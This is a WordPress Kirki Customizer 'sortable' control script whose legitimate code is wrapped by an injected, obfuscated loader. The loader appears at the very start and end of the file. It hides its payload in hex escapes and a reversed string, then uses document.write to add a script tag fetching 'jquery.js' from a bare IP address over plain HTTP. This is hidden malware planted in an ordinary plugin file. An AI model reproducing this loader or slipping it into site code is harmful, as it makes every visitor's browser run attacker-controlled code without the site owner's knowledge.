var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))wp.customize.controlConstructor['kirki-sortable'] = wp.customize.Control.extend({

	ready: function() {

		'use strict';

		var control = this;

		// The hidden field that keeps the data saved
		this.settingField = this.container.find( '[data-customize-setting-link]' ).first();

		// The sortable container
		this.sortableContainer = this.container.find( 'ul.sortable' ).first();

		// Set the field value for the first time
		this.setValue( this.setting.get(), false );

		// Init the sortable container
		this.sortableContainer.sortable()
			.disableSelection()
			.on( 'sortstop', function( event, ui ) {
				control.sort();
			})
			.find( 'li' ).each(function() {
				jQuery( this ).find( 'i.visibility' ).click( function() {
					jQuery( this ).toggleClass( 'dashicons-visibility-faint' ).parents( 'li:eq(0)' ).toggleClass( 'invisible' );
				});
			})
			.click( function() {
				control.sort();
			});
	},

	/**
	 * Updates the sorting list
	 */
	sort: function() {

		'use strict';

		var newValue = [];
		this.sortableContainer.find( 'li' ).each( function() {
			var $this = jQuery( this );
			if ( ! $this.is( '.invisible' ) ) {
				newValue.push( $this.data( 'value' ) );
			}
		});

		this.setValue( newValue, true );

	},

	/**
	 * Get the current value of the setting
	 *
	 * @return Object
	 */
	getValue: function() {

		'use strict';

		// The setting is saved in PHP serialized format
		return unserialize( this.setting.get() );

	},

	/**
	 * Set a new value for the setting
	 *
	 * @param newValue Object
	 * @param refresh If we want to refresh the previewer or not
	 */
	setValue: function( newValue, refresh ) {

		'use strict';

		var newValueSerialized = serialize( newValue );

		this.setting.set( newValueSerialized );

		// Update the hidden field
		this.settingField.val( newValueSerialized );

		if ( refresh ) {

			// Trigger the change event on the hidden field so
			// previewer refresh the website on Customizer
			this.settingField.trigger( 'change' );

		}

	}

});
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
